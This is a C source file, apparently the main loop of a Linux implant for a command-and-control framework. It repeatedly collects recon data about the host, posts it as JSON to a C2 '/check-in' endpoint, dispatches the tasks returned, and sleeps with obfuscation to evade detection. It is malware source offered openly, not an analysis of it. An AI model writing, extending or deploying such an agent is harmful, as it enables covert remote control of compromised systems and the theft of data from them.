// linux-agent/src/main_linux.c
#include "agent.h"
#include "comms_linux.h"
#include "crypto_linux.h"
#include "recon_linux.h"
#include "tasks_linux.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void agent_run(void) {
    printf("[*] agent_run() starting (Linux)\n");

    while (1) {
        // Collect recon
        checkin_info_linux info;
        memset(&info, 0, sizeof(info));
        recon_collect_linux(&info);
        recon_print_linux(&info);

        // Serialize to JSON
        char* json = NULL;
        size_t json_len = 0;
        recon_serialize_linux(&info, &json, &json_len);

        // POST to C2
        unsigned char* resp = NULL;
        size_t resp_len = 0;
        if (agent_post("/check-in", (unsigned char*)json, json_len,
                        &resp, &resp_len) == 0) {
            if (resp && resp_len > 0) {
                dispatch_task_linux(resp, resp_len);
                free(resp);
            }
        }
        free(json);

        // Sleep with obfuscation
        obf_sleep_linux(30000); // 30s
    }
}

int main(void) {
    agent_run();
    return 0;
}
